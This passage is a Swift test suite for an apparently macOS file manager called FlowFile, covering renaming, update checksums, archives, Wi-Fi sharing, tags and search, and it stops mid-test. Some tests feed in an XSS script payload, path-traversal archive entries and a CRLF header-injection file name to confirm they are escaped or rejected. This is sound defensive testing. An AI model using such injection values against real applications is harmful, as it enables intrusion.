import AppKit
import CoreServices
import CryptoKit
import Foundation
import ImageIO
import PDFKit
import UniformTypeIdentifiers
@testable import FlowFile

#if canImport(XCTest)
import XCTest
#endif

struct TestAssertionError: LocalizedError {
    let description: String
    var errorDescription: String? { description }
}

enum FlowFileVerificationSuite {
    static func expect(
        _ condition: @autoclosure () throws -> Bool,
        _ message: String = "Assertion failed",
        file: StaticString = #filePath,
        line: UInt = #line
    ) throws {
        if try !condition() {
            #if canImport(XCTest)
            XCTFail(message, file: file, line: line)
            #endif
            throw TestAssertionError(description: "\(file):\(line): \(message)")
        }
    }

    static func expectThrows(
        _ message: String = "Expected error to be thrown",
        file: StaticString = #filePath,
        line: UInt = #line,
        _ block: () throws -> Void
    ) throws {
        do {
            try block()
        } catch {
            return
        }
        #if canImport(XCTest)
        XCTFail(message, file: file, line: line)
        #endif
        throw TestAssertionError(description: "\(file):\(line): \(message)")
    }

    private static func withTempDir(_ body: (URL) async throws -> Void) async throws {
        let dir = URL(fileURLWithPath: NSTemporaryDirectory(), isDirectory: true)
            .appendingPathComponent("FlowFileTests_\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        try await body(dir)
    }

    // MARK: - 1 & 10: Multi-Rename masks, uppercase extensions, case-only renames & transactional rollback

    static func multiRenameUppercaseAndCaseOnly() async throws {
        try await withTempDir { tempDir in
            let img1 = tempDir.appendingPathComponent("IMG_0001.JPG")
            let img2 = tempDir.appendingPathComponent("IMG_0002.JPG")
            try Data("a".utf8).write(to: img1)
            try Data("b".utf8).write(to: img2)

            let items = try FileSystemService.listDirectory(at: tempDir, showHidden: false)
                .sorted { $0.name < $1.name }
            try expect(items.count == 2)
            try expect(items[0].rawFileExtension == "JPG")

            var config = MultiRenameConfig()
            let unchangedPreview = MultiRenameService.generatePreview(items: items, config: config)
            try expect(unchangedPreview.map(\.status) == [.unchanged, .unchanged], "Unchanged .JPG should not conflict")

            config.searchText = "0001"
            config.replaceText = "0099"
            let partialPreview = MultiRenameService.generatePreview(items: items, config: config)
            try expect(partialPreview[0].status == .ready)
            try expect(partialPreview[0].proposedName == "IMG_0099.JPG")
            try expect(partialPreview[1].status == .unchanged)

            var lowerConfig = MultiRenameConfig()
            lowerConfig.caseTransform = .lowercase
            let lowerPreview = MultiRenameService.generatePreview(items: items, config: lowerConfig)
            try expect(lowerPreview.map(\.status) == [.ready, .ready], "Case-only batch rename must be ready")

            let undo = try MultiRenameService.executeBatchRename(rows: lowerPreview)
            try expect(undo.pairs.count == 2)
            let namesAfter = try FileManager.default.contentsOfDirectory(atPath: tempDir.path).sorted()
            try expect(namesAfter == ["img_0001.jpg", "img_0002.jpg"])

            try MultiRenameService.undoBatchRename(undo)
            let namesRestored = try FileManager.default.contentsOfDirectory(atPath: tempDir.path).sorted()
            try expect(namesRestored == ["IMG_0001.JPG", "IMG_0002.JPG"])
        }
    }

    static func batchRenameRollbackOnMidBatchFailure() async throws {
        try await withTempDir { tempDir in
            let f1 = tempDir.appendingPathComponent("alpha.txt")
            let f2 = tempDir.appendingPathComponent("beta.txt")
            let f3 = tempDir.appendingPathComponent("gamma.txt")
            try Data("1".utf8).write(to: f1)
            try Data("2".utf8).write(to: f2)
            try Data("3".utf8).write(to: f3)

            let items = try FileSystemService.listDirectory(at: tempDir, showHidden: false)
                .sorted { $0.name < $1.name }

            var config = MultiRenameConfig()
            config.nameMask = "item_[C]"
            config.counterDigits = 2
            let preview = MultiRenameService.generatePreview(items: items, config: config)
            try expect(preview.allSatisfy { $0.status == .ready })

            var callCount = 0
            try expectThrows("Simulated Phase 2 failure must throw") {
                _ = try MultiRenameService.executeBatchRename(rows: preview) { src, dst in
                    callCount += 1
                    if callCount == 5 {
                        throw NSError(domain: "TestError", code: 99, userInfo: [NSLocalizedDescriptionKey: "Disk error"])
                    }
                    try FileManager.default.moveItem(at: src, to: dst)
                }
            }

            let allEntriesIncludingHidden = try FileManager.default.contentsOfDirectory(atPath: tempDir.path).sorted()
            try expect(allEntriesIncludingHidden == ["alpha.txt", "beta.txt", "gamma.txt"], "Zero hidden temp files may remain")
            try expect(try String(contentsOf: f1, encoding: .utf8) == "1")
            try expect(try String(contentsOf: f2, encoding: .utf8) == "2")
            try expect(try String(contentsOf: f3, encoding: .utf8) == "3")
        }
    }

    static func singleItemCaseOnlyRename() async throws {
        try await withTempDir { tempDir in
            let readme = tempDir.appendingPathComponent("readme.md")
            try Data("hello".utf8).write(to: readme)

            let renamed = try FileSystemService.renameItem(at: readme, to: "README.md")
            try expect(renamed.lastPathComponent == "README.md")
            let entries = try FileManager.default.contentsOfDirectory(atPath: tempDir.path)
            try expect(entries == ["README.md"])

            let other = tempDir.appendingPathComponent("notes.md")
            try Data("other".utf8).write(to: other)
            try expectThrows("Colliding distinct file must fail") {
                _ = try FileSystemService.renameItem(at: other, to: "readme.md")
            }

            let items = try FileSystemService.listDirectory(at: tempDir, showHidden: false)
                .filter { $0.name == "README.md" }
            var cfg = MultiRenameConfig()
            cfg.nameMask = "[N1-4]"
            let rows = MultiRenameService.generatePreview(items: items, config: cfg)
            try expect(rows.first?.proposedName == "READ.md")
        }
    }

    // MARK: - 2 & 6: UpdateService version comparison & fail-closed SHA-256 verification

    static func updateVerificationFailsClosed() async throws {
        try await withTempDir { tempDir in
            try expect(UpdateService.isVersion("v1.0.3", newerThan: "1.0.2"))
            try expect(UpdateService.isVersion("1.2.0", newerThan: "1.1.9"))
            try expect(!UpdateService.isVersion("1.0.2", newerThan: "1.0.2"))
            try expect(!UpdateService.isVersion("1.0.1", newerThan: "1.0.2"))

            let payload = Data("verified-release-archive".utf8)
            let zipFile = tempDir.appendingPathComponent("FlowFile-Update.zip")
            try payload.write(to: zipFile)
            let validHash = SHA256.hash(data: payload).map { String(format: "%02x", $0) }.joined()

            let validManifest = Data("\(validHash)  FlowFile-Update.zip\n".utf8)
            try UpdateService.verifySHA256Checksum(
                of: zipFile,
                filename: "FlowFile-Update.zip",
                manifestData: validManifest
            )

            let missingEntryManifest = Data("\(validHash)  OtherFile.dmg\n".utf8)
            try expectThrows("Missing filename entry must fail closed") {
                try UpdateService.verifySHA256Checksum(
                    of: zipFile,
                    filename: "FlowFile-Update.zip",
                    manifestData: missingEntryManifest
                )
            }

            let invalidUTF8 = Data([0xFF, 0xFE, 0x80, 0x81])
            try expectThrows("Non-UTF8 manifest must fail closed") {
                try UpdateService.verifySHA256Checksum(
                    of: zipFile,
                    filename: "FlowFile-Update.zip",
                    manifestData: invalidUTF8
                )
            }

            let truncatedManifest = Data("deadbeef  FlowFile-Update.zip\n".utf8)
            try expectThrows("Truncated hex must fail closed") {
                try UpdateService.verifySHA256Checksum(
                    of: zipFile,
                    filename: "FlowFile-Update.zip",
                    manifestData: truncatedManifest
                )
            }

            let wrongHash = String(repeating: "a", count: 64)
            let wrongManifest = Data("\(wrongHash)  FlowFile-Update.zip\n".utf8)
            try expectThrows("Mismatched hash must fail closed") {
                try UpdateService.verifySHA256Checksum(
                    of: zipFile,
                    filename: "FlowFile-Update.zip",
                    manifestData: wrongManifest
                )
            }

            let translocated = URL(fileURLWithPath: "/private/var/folders/xx/yy/T/AppTranslocation/1234/d/FlowFile.app")
            try expectThrows("App Translocation path must be rejected") {
                try UpdateService.preflightValidateTargetLocation(translocated)
            }
        }
    }

    static func releaseNotesCleaningAndPayloadParsing() throws {
        let rawGitHubBody = """
        Hva er nytt og forbedret i FlowFile 1.0.4:

        - Ny «Hva er nytt»-visning i oppdateringsvinduet.
        - Fikset automatisk omstart ved åpent modalt ark.

        <!-- flowfile-install-footer -->
        ---

        #### Sømløs installasjon med Homebrew (uten Gatekeeper-advarsel)
        ```zsh
        brew install --cask flowfile
        ```

        #### SHA-256 sjekksummer
        ```
        74203fd93f65c5c30a95b2c3e111c520e2b59b9ff1d63af21d81ce1447c5fb35  FlowFile-Update.zip
        ```
        """

        let cleaned = UpdateService.cleanReleaseNotes(rawGitHubBody)
        try expect(cleaned.contains("• Ny «Hva er nytt»-visning i oppdateringsvinduet."))
        try expect(cleaned.contains("• Fikset automatisk omstart ved åpent modalt ark."))
        try expect(!cleaned.contains("brew install"))
        try expect(!cleaned.contains("SHA-256"))
        try expect(!cleaned.contains("flowfile-install-footer"))

        let legacyBody = """
        ### FlowFile 1.0.3 for macOS 26

        Bygget direkte fra åpen Swift-kildekode på GitHub Actions (`macos-26`).

        #### Sømløs installasjon med Homebrew (uten Gatekeeper-advarsel)
        brew install --cask flowfile
        """
        let cleanedLegacy = UpdateService.cleanReleaseNotes(legacyBody)
        try expect(cleanedLegacy.isEmpty)

        let payload: [String: Any] = [
            "tag_name": "v1.0.4",
            "name": "FlowFile 1.0.4",
            "body": rawGitHubBody,
            "assets": [
                [
                    "name": "FlowFile-Update.zip",
                    "browser_download_url": "https://github.com/nordiccraft/FlowFile/releases/download/v1.0.4/FlowFile-Update.zip"
                ],
                [
                    "name": "SHA256SUMS.txt",
                    "browser_download_url": "https://github.com/nordiccraft/FlowFile/releases/download/v1.0.4/SHA256SUMS.txt"
                ]
            ]
        ]
        let payloadData = try JSONSerialization.data(withJSONObject: payload)
        let parsed = try UpdateService.parseReleasePayload(data: payloadData)
        try expect(parsed.version == "1.0.4")
        try expect(parsed.releaseNotes.contains("• Ny «Hva er nytt»-visning"))
        try expect(!parsed.releaseNotes.contains("brew install"))
        try expect(parsed.zipDownloadURL?.absoluteString.hasSuffix("FlowFile-Update.zip") == true)
        try expect(parsed.checksumsURL?.absoluteString.hasSuffix("SHA256SUMS.txt") == true)
    }

    static func atomicBundleInstallReplacesCleanly() async throws {
        try await withTempDir { tempDir in
            let appsDir = tempDir.appendingPathComponent("Apps", isDirectory: true)
            let incomingDir = tempDir.appendingPathComponent("Incoming", isDirectory: true)
            try FileManager.default.createDirectory(at: appsDir, withIntermediateDirectories: true)
            try FileManager.default.createDirectory(at: incomingDir, withIntermediateDirectories: true)

            let installedApp = appsDir.appendingPathComponent("FlowFile.app", isDirectory: true)
            let installedMacOS = installedApp.appendingPathComponent("Contents/MacOS", isDirectory: true)
            try FileManager.default.createDirectory(at: installedMacOS, withIntermediateDirectories: true)
            try Data("old-1.0.3".utf8).write(to: installedMacOS.appendingPathComponent("FlowFile"))

            let extractedApp = incomingDir.appendingPathComponent("FlowFile.app", isDirectory: true)
            let extractedMacOS = extractedApp.appendingPathComponent("Contents/MacOS", isDirectory: true)
            try FileManager.default.createDirectory(at: extractedMacOS, withIntermediateDirectories: true)
            try Data("new-1.0.5".utf8).write(to: extractedMacOS.appendingPathComponent("FlowFile"))

            try UpdateService.installExtractedBundleAtomically(
                extractedApp: extractedApp,
                destinationAppURL: installedApp
            )

            let updatedPayload = try String(
                contentsOf: installedMacOS.appendingPathComponent("FlowFile"),
                encoding: .utf8
            )
            try expect(updatedPayload == "new-1.0.5")

            let allEntries = try FileManager.default.contentsOfDirectory(atPath: appsDir.path)
            try expect(allEntries == ["FlowFile.app"], "No hidden staging or backup bundles may remain")
        }
    }

    // MARK: - 11, 12, 13 & Path Traversal: ArchiveService & TabState

    static func archiveSecurityAndWildcards() async throws {
        try await withTempDir { tempDir in
            try expect(ArchiveService.archiveBaseName(for: URL(fileURLWithPath: "/tmp/archive.tar.xz")) == "archive")
            try expect(ArchiveService.archiveBaseName(for: URL(fileURLWithPath: "/tmp/archive.tar.gz")) == "archive")

            try expect(ArchiveService.sanitizeArchiveEntryPath("../outside.txt") == nil)
            try expect(ArchiveService.sanitizeArchiveEntryPath("sub/../../outside.txt") == nil)
            try expect(ArchiveService.sanitizeArchiveEntryPath("./file.txt") == nil)
            try expect(ArchiveService.sanitizeArchiveEntryPath("/folder/[v1] file.txt") == "folder/[v1] file.txt")

            let latin1Bytes = Data([0x62, 0x6C, 0xE5, 0x62, 0xE6, 0x72, 0x2E, 0x74, 0x78, 0x74])
            let decoded = ArchiveService.decodeArchiveOutput(latin1Bytes)
            try expect(!decoded.isEmpty && decoded.hasSuffix(".txt"))

            let corruptZip = tempDir.appendingPathComponent("corrupt.zip")
            try Data("not-a-real-zip".utf8).write(to: corruptZip)
            try expectThrows("Corrupt archive must throw") {
                _ = try ArchiveService.extractEntireArchive(corruptZip, in: tempDir)
            }
            try expect(!FileManager.default.fileExists(atPath: tempDir.appendingPathComponent("corrupt").path))

            let srcFolder = tempDir.appendingPathComponent("src_special", isDirectory: true)
            try FileManager.default.createDirectory(at: srcFolder, withIntermediateDirectories: true)
            let trickyName = "[draft] report*2026?.txt"
            let trickyFile = srcFolder.appendingPathComponent(trickyName)
            try Data("glob-safe-content".utf8).write(to: trickyFile)

            let createdZip = try ArchiveService.compressToZip(urls: [trickyFile], in: tempDir, archiveName: "tricky.zip")
            let listed = try ArchiveService.listVirtualDirectory(archiveURL: createdZip, subpath: "", showHidden: false)
            try expect(listed.map(\.name) == [trickyName])

            let outDir = tempDir.appendingPathComponent("extracted_out", isDirectory: true)
            try FileManager.default.createDirectory(at: outDir, withIntermediateDirectories: true)
            try expectThrows("Traversal entry path must be rejected") {
                _ = try ArchiveService.extractEntries(
                    from: createdZip,
                    entryPaths: ["../escaped.txt"],
                    currentSubpath: "",
                    to: outDir
                )
            }

            let extractedFiles = try ArchiveService.extractEntries(
                from: createdZip,
                entryPaths: [trickyName],
                currentSubpath: "",
                to: outDir
            )
            try expect(extractedFiles.count == 1)
            try expect(try String(contentsOf: extractedFiles[0], encoding: .utf8) == "glob-safe-content")
        }
    }

    static func folderNamedLikeArchive() async throws {
        try await withTempDir { tempDir in
            let folderNamedTar = tempDir.appendingPathComponent("project.tar", isDirectory: true)
            try FileManager.default.createDirectory(at: folderNamedTar, withIntermediateDirectories: true)
            let insideFile = folderNamedTar.appendingPathComponent("inside.txt")
            let hiddenFile = folderNamedTar.appendingPathComponent(".secret")
            try Data("ok".utf8).write(to: insideFile)
            try Data("hidden".utf8).write(to: hiddenFile)

            let tab = TabState(initialURL: tempDir, showHidden: false)
            tab.navigate(to: folderNamedTar, showHidden: false)

            try expect(!tab.isInsideArchive)
            try expect(tab.currentURL.standardizedFileURL == folderNamedTar.standardizedFileURL)
            try expect(tab.displayedItems.map(\.name) == ["inside.txt"])

            tab.reload(showHidden: true)
            try expect(tab.currentShowHidden)
            try expect(tab.displayedItems.map(\.name) == [".secret", "inside.txt"])
        }
    }

    // MARK: - 7 & 8: LocalWiFiShareServer XSS escaping, 128-bit token & restart cancellation safety

    static func wifiShareSecurity() throws {
        let token = LocalWiFiShareServer.generateSecurityToken()
        try expect(token.count == 32)
        try expect(token.allSatisfy(\.isHexDigit))

        let maliciousName = "<script>alert('xss')</script>\"&.txt"
        let html = LocalWiFiShareServer.buildLandingPageHTML(
            fileName: maliciousName,
            sizeString: "12 KB",
            securityToken: token
        )
        try expect(!html.contains("<script>"))
        try expect(html.contains("&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;&amp;.txt"))

        let disposition = LocalWiFiShareServer.contentDispositionHeaderValue(for: "bad\"\r\nname.txt")
        try expect(!disposition.contains("\r") && !disposition.contains("\n"))
    }

    @MainActor
    static func wifiShareRestartCancellationSafety() async throws {
        try await withTempDir { tempDir in
            let fileA = tempDir.appendingPathComponent("a.txt")
            let fileB = tempDir.appendingPathComponent("b.txt")
            try Data("A".utf8).write(to: fileA)
            try Data("B".utf8).write(to: fileB)

            let server = LocalWiFiShareServer()
            server.autoExpireNanoseconds = 60_000_000
            server.startSharing(fileURL: fileA)
            let firstToken = server.securityToken

            server.autoExpireNanoseconds = 10_000_000_000
            server.startSharing(fileURL: fileB)
            let secondToken = server.securityToken
            try expect(firstToken != secondToken)

            try await Task.sleep(nanoseconds: 180_000_000)
            try expect(server.sharedFileName == "b.txt")
            try expect(server.securityToken == secondToken)
            server.stop()
        }
    }

    // MARK: - 15 & 16: GitStatusService pure-Swift root lookup & UTF8ChunkDecoder split multi-byte chunks

    static func gitRepoRootLookup() async throws {
        try await withTempDir { tempDir in
            try expect(GitStatusService.findGitRepoRoot(from: tempDir) == nil)

            let fakeRepo = tempDir.appendingPathComponent("repo", isDirectory: true)
            let dotGit = fakeRepo.appendingPathComponent(".git", isDirectory: true)
            let nested = fakeRepo.appendingPathComponent("Sources/Sub", isDirectory: true)
            try FileManager.default.createDirectory(at: dotGit, withIntermediateDirectories: true)
            try FileManager.default.createDirectory(at: nested, withIntermediateDirectories: true)

            try expect(GitStatusService.findGitRepoRoot(from: nested) == fakeRepo.standardizedFileURL)
        }
    }

    static func utf8ChunkDecoderSplitBoundaries() throws {
        let original = String(repeating: "a", count: 4094) + "æøå✓\u{1F680}slutt\n"
        let fullData = Data(original.utf8)

        var decoder4096 = UTF8ChunkDecoder()
        let part1 = fullData.prefix(4095)
        let part2 = fullData.dropFirst(4095)
        let reconstructed4096 = decoder4096.decode(Data(part1)) + decoder4096.decode(Data(part2)) + decoder4096.flushRemainder()
        try expect(reconstructed4096 == original)

        var byteDecoder = UTF8ChunkDecoder()
        var stepOutput = ""
        for b in fullData {
            stepOutput += byteDecoder.decode(Data([b]))
        }
        stepOutput += byteDecoder.flushRemainder()
        try expect(stepOutput == original)
    }

    // MARK: - Default File Browser & Smart External Tab Routing

    @MainActor
    static func defaultFileBrowserAndSmartTabRouting() async throws {
        try await withTempDir { tempDir in
            // 1. LSHandlers deduplication when toggling between FlowFile and Finder
            let initialHandlers: [[String: Any]] = [
                ["LSHandlerContentType": "public.plain-text", "LSHandlerRoleAll": "com.apple.TextEdit"],
                ["LSHandlerContentType": "public.folder", "LSHandlerRoleAll": "com.apple.finder"],
                ["LSHandlerContentType": "PUBLIC.FOLDER", "LSHandlerRoleAll": "com.old.app"]
            ]
            let withFlowFile = DefaultFileBrowserService.upsertLaunchServicesFolderHandler(
                in: initialHandlers,
                bundleID: DefaultFileBrowserService.flowFileBundleID
            )
            try expect(withFlowFile.count == 2, "Duplicate public.folder entries must be collapsed to one")
            try expect((withFlowFile.last?["LSHandlerRoleAll"] as? String) == "com.flowfile.app")

            let restoredFinder = DefaultFileBrowserService.upsertLaunchServicesFolderHandler(
                in: withFlowFile,
                bundleID: DefaultFileBrowserService.finderBundleID
            )
            try expect(restoredFinder.count == 2)
            try expect((restoredFinder.last?["LSHandlerRoleAll"] as? String) == "com.apple.finder")

            // 2. Folder vs File vs .app bundle resolution for open and reveal ('mvis') events
            let downloadsDir = tempDir.appendingPathComponent("Downloads", isDirectory: true)
            let workDir = tempDir.appendingPathComponent("Work", isDirectory: true)
            let appBundle = downloadsDir.appendingPathComponent("Sample.app", isDirectory: true)
            try FileManager.default.createDirectory(at: downloadsDir, withIntermediateDirectories: true)
            try FileManager.default.createDirectory(at: workDir, withIntermediateDirectories: true)
            try FileManager.default.createDirectory(at: appBundle, withIntermediateDirectories: true)

            let pdfA = downloadsDir.appendingPathComponent("alpha.pdf")
            let pdfB = downloadsDir.appendingPathComponent("beta.pdf")
            try Data("A".utf8).write(to: pdfA)
            try Data("B".utf8).write(to: pdfB)

            let openFolderRes = DefaultFileBrowserService.resolveExternalTarget(for: downloadsDir, isRevealEvent: false)
            try expect(openFolderRes.folderURL == downloadsDir.standardizedFileURL)
            try expect(openFolderRes.itemToSelect == nil)

            let revealFolderRes = DefaultFileBrowserService.resolveExternalTarget(for: downloadsDir, isRevealEvent: true)
            try expect(revealFolderRes.folderURL == tempDir.standardizedFileURL)
            try expect(revealFolderRes.itemToSelect == downloadsDir.standardizedFileURL)

            let revealFileRes = DefaultFileBrowserService.resolveExternalTarget(for: pdfA, isRevealEvent: true)
            try expect(revealFileRes.folderURL == downloadsDir.standardizedFileURL)
            try expect(revealFileRes.itemToSelect == pdfA.standardizedFileURL)

            let openPackageRes = DefaultFileBrowserService.resolveExternalTarget(for: appBundle, isRevealEvent: false)
            try expect(openPackageRes.folderURL == downloadsDir.standardizedFileURL, ".app package should reveal in parent folder")
            try expect(openPackageRes.itemToSelect == appBundle.standardizedFileURL)

            // 3. Apple Event ('mvis') list extraction
            let event = NSAppleEventDescriptor.appleEvent(
                withEventClass: AEEventClass(0x666E6472),
                eventID: AEEventID(0x6D766973),
                targetDescriptor: nil,
                returnID: AEReturnID(kAutoGenerateReturnID),
                transactionID: AETransactionID(kAnyTransactionID)
            )
            let listDesc = NSAppleEventDescriptor.list()
            listDesc.insert(NSAppleEventDescriptor(fileURL: pdfA), at: 1)
            listDesc.insert(NSAppleEventDescriptor(fileURL: pdfB), at: 2)
            event.setParam(listDesc, forKeyword: AEKeyword(keyDirectObject))
            let extracted = DefaultFileBrowserService.extractURLs(fromAppleEvent: event)
            try expect(extracted.map(\.standardizedFileURL) == [pdfA.standardizedFileURL, pdfB.standardizedFileURL])

            // 4. Smart New Tab, Reuse Existing Tab & Active Tab routing in WorkspaceState
            let ws = WorkspaceState()
            ws.externalOpenTabBehavior = .smartNewTab

            // Cold launch reuses the initial tab instead of leaving an extra Home tab
            ws.handleExternalOpenOrReveal(urls: [workDir], isRevealEvent: false, isColdLaunchOverride: true)
            try expect(ws.activePane.tabs.count == 1)
            try expect(ws.activeTab.currentURL == workDir.standardizedFileURL)

            // Subsequent reveal in another folder opens a new tab and selects the file
            ws.handleExternalOpenOrReveal(urls: [pdfA], isRevealEvent: true, isColdLaunchOverride: false)
            try expect(ws.activePane.tabs.count == 2)
            try expect(ws.activeTab.currentURL == downloadsDir.standardizedFileURL)
            try expect(ws.activeTab.selectedURLs == [pdfA.standardizedFileURL])

            // Revealing a second file in the already-open Downloads folder reuses that tab instead of creating a 3rd tab
            ws.activePane.activeTabID = ws.activePane.tabs[0].id
            ws.handleExternalOpenOrReveal(urls: [pdfB], isRevealEvent: true, isColdLaunchOverride: false)
            try expect(ws.activePane.tabs.count == 2, "Must reuse existing Downloads tab")
            try expect(ws.activeTab.currentURL == downloadsDir.standardizedFileURL)
            try expect(ws.activeTab.selectedURLs == [pdfB.standardizedFileURL])

            // ActiveTab preference navigates in-place without adding tabs
            ws.externalOpenTabBehavior = .activeTab
            ws.handleExternalOpenOrReveal(urls: [tempDir], isRevealEvent: false, isColdLaunchOverride: false)
            try expect(ws.activePane.tabs.count == 2)
            try expect(ws.activeTab.currentURL == tempDir.standardizedFileURL)
        }
    }

    // MARK: - 14: Finder Color Tags & Workspace Session Persistence

    static func colorTagsAndWorkspaceSessionPersistence() async throws {
        try await withTempDir { tempDir in
            let docA = tempDir.appendingPathComponent("rapport.txt")
            let docB = tempDir.appendingPathComponent("budsjett.txt")
            try Data("rapport".utf8).write(to: docA)
            try Data("budsjett".utf8).write(to: docB)

            // Custom non-color tag must be preserved when setting/clearing color tags
            try TagService.writeTagNames(["ProsjektX"], to: docA)
            try TagService.toggleColorTag(.red, on: [docA, docB])
            try expect(TagService.readColorTags(at: docA) == [.red])
            try expect(TagService.readColorTags(at: docB) == [.red])
            try expect(TagService.readTagNames(at: docA).contains("ProsjektX"))

            // Directory listing prefetches color tags onto FileItem
            let listed = try FileSystemService.listDirectory(at: tempDir, showHidden: false)
            try expect(listed.allSatisfy { $0.colorTags == [.red] })

            let foundRed = await TagService.findItemsWithColorTag(.red, inRoots: [tempDir], showHidden: false)
            try expect(foundRed.count == 2)

            // Toggling again when all items already have .red removes .red while keeping "ProsjektX"
            try TagService.toggleColorTag(.red, on: [docA, docB])
            try expect(TagService.readColorTags(at: docA).isEmpty)
            try expect(TagService.readTagNames(at: docA) == ["ProsjektX"])

            // TabSessionPersistence & SavedWorkspace round-trip in isolated UserDefaults suite
            let suiteName = "com.flowfile.tests.\(UUID().uuidString)"
            guard let defaults = UserDefaults(suiteName: suiteName) else {
                throw TestAssertionError(description: "Could not create isolated UserDefaults")
            }
            defer { defaults.removePersistentDomain(forName: suiteName) }

            let subA = tempDir.appendingPathComponent("LeftFolder", isDirectory: true)
            let subB = tempDir.appendingPathComponent("RightFolder", isDirectory: true)
            try FileManager.default.createDirectory(at: subA, withIntermediateDirectories: true)
            try FileManager.default.createDirectory(at: subB, withIntermediateDirectories: true)

            let snap = TabSessionSnapshot(
                isDualPane: true,
                activePaneRaw: "right",
                leftTabPaths: [subA.path, "/nonexistent/deleted/path"],
                rightTabPaths: [subB.path],
                activeLeftIndex: 0,
                activeRightIndex: 0
            )
            TabSessionPersistence.saveLastSession(snap, defaults: defaults)
            try expect(TabSessionPersistence.loadLastSession(defaults: defaults) == snap)

            let validated = TabSessionPersistence.validatedDirectoryURLs(from: snap.leftTabPaths, fallbackURL: tempDir)
            try expect(validated == [subA.standardizedFileURL])

            let fallbackValidated = TabSessionPersistence.validatedDirectoryURLs(from: ["/missing/one"], fallbackURL: tempDir)
            try expect(fallbackValidated == [tempDir.standardizedFileURL])

            let savedWS = SavedWorkspace(name: "Utvikling", snapshot: snap)
            TabSessionPersistence.saveWorkspaces([savedWS], defaults: defaults)
            let loadedWS = TabSessionPersistence.loadWorkspaces(defaults: defaults)
            try expect(loadedWS.count == 1)
            try expect(loadedWS.first?.name == "Utvikling")
        }
    }

    // MARK: - 15: Deep Search, Flat Branch View, Disk Space Analyzer & Duplicate Finder

    static func deepSearchFlatViewDiskSpaceAndDuplicates() async throws {
        try await withTempDir { tempDir in
            let sub1 = tempDir.appendingPathComponent("Alpha", isDirectory: true)
            let sub2 = tempDir.appendingPathComponent("Beta/Nested", isDirectory: true)
            try FileManager.default.createDirectory(at: sub1, withIntermediateDirectories: true)
            try FileManager.default.createDirectory(at: sub2, withIntermediateDirectories: true)

            let f1 = sub1.appendingPathComponent("notes.md")
            let f2 = sub2.appendingPathComponent("invoice_2026.txt")
            let f2Dup = sub1.appendingPathComponent("invoice_copy.txt")
            let fSameSizeDiffContent = sub1.appendingPathComponent("different.txt")

            let sharedPayload = Data(repeating: 0x41, count: 4096) + Data("HEMMELIG_FAKTURA_KODE\n".utf8)
            var diffPayload = Data(repeating: 0x42, count: 4096) + Data("ANNEN_TEKST_MED_LENGDE".utf8)
            // Make sure diffPayload has exact same byte count as sharedPayload to verify SHA-256 stage
            if diffPayload.count < sharedPayload.count {
                diffPayload.append(Data(repeating: 0x20, count: sharedPayload.count - diffPayload.count))
            } else if diffPayload.count > sharedPayload.count {
                diffPayload = diffPayload.prefix(sharedPayload.count)
            }

            try Data("Vanlig notat uten nøkkelord".utf8).write(to: f1)
            try sharedPayload.write(to: f2)
            try sharedPayload.write(to: f2Dup)
            try diffPayload.write(to: fSameSizeDiffContent)

            // Set older mtime on f2 and newer mtime on f2Dup
            let olderDate = Date(timeIntervalSinceNow: -3600)
            let newerDate = Date()
            try FileManager.default.setAttributes([.modificationDate: olderDate], ofItemAtPath: f2.path)
            try FileManager.default.setAttributes([.modificationDate: newerDate], ofItemAtPath: f2Dup.path)

            // 1. DeepSearchService content search + wildcard globs (*.apk, prefix, ?, multi-pattern) + symlink root
            let contentMatches = await DeepSearchService.search(
                DeepSearchQuery(rootURL: tempDir, nameQuery: "", contentQuery: "HEMMELIG_FAKTURA_KODE")
            )
            try expect(contentMatches.count == 2)
            try expect(contentMatches.allSatisfy { ($0.matchedLinePreview ?? "").contains("HEMMELIG_FAKTURA_KODE") })

            let apkFile = sub2.appendingPathComponent("MyApp-release.apk")
            try Data("apk".utf8).write(to: apkFile)
            defer { try? FileManager.default.removeItem(at: apkFile) }

            let apkMatches = await DeepSearchService.search(DeepSearchQuery(rootURL: tempDir, nameQuery: "*.apk"))
            try expect(apkMatches.count == 1 && apkMatches[0].item.name == "MyApp-release.apk")

            let prefixMatches = await DeepSearchService.search(DeepSearchQuery(rootURL: tempDir, nameQuery: "myapp"))
            try expect(prefixMatches.count == 1)

            let multiPattern = await DeepSearchService.search(DeepSearchQuery(rootURL: tempDir, nameQuery: "*.apk; *.md"))
            try expect(multiPattern.count == 2)

            // Symlinked root folder must still return results
            let symlinkRoot = tempDir.deletingLastPathComponent().appendingPathComponent("SymlinkSearch_\(UUID().uuidString)")
            try FileManager.default.createSymbolicLink(at: symlinkRoot, withDestinationURL: tempDir)
            defer { try? FileManager.default.removeItem(at: symlinkRoot) }
            let viaSymlink = await DeepSearchService.search(DeepSearchQuery(rootURL: symlinkRoot, nameQuery: "*.apk"))
            try expect(viaSymlink.count == 1)

            // Quick filter in TabState also supports *.apk wildcards
            let filterTab = TabState(initialURL: sub2, showHidden: false)
            filterTab.filterQuery = "*.apk"
            try expect(filterTab.displayedItems.count == 1 && filterTab.displayedItems[0].name == "MyApp-release.apk")
            try FileManager.default.removeItem(at: apkFile)

            // 2. FlatBranchService & TabState flat toggle
            let flatItems = try FlatBranchService.listRecursiveFiles(at: tempDir, showHidden: false)
            try expect(flatItems.count == 4, "All 4 nested files should be flattened without directory rows")
            try expect(flatItems.contains(where: { $0.name == "invoice_2026.txt" && $0.relativeSubpath == "Beta/Nested" }))

            let tab = TabState(initialURL: tempDir, showHidden: false)
            try expect(!tab.isFlatBranchView)
            tab.toggleFlatBranchView(showHidden: false)
            try expect(tab.isFlatBranchView)
            try expect(tab.displayedItems.count == 4)

            // 3. DiskSpaceAnalyzerService
            let spaceReport = await DiskSpaceAnalyzerService.analyze(directory: tempDir, includeHidden: false)
            try expect(spaceReport.scannedFileCount == 4)
            try expect(spaceReport.totalBytes > 0)
            try expect(spaceReport.children.count == 2, "Root has Alpha and Beta immediate subfolders")
            try expect(spaceReport.children.first?.name == "Alpha", "Alpha holds 3 files vs Beta's 1 file")

            // 4. DuplicateFinderService (must group f2 & f2Dup, and exclude fSameSizeDiffContent!)
            let dupGroups = await DuplicateFinderService.scanForDuplicates(inRoots: [tempDir], includeHidden: false)
            try expect(dupGroups.count == 1)
            try expect(dupGroups[0].items.count == 2)

            let trashKeepingNewest = DuplicateFinderService.urlsToTrashKeepingNewest(in: dupGroups)
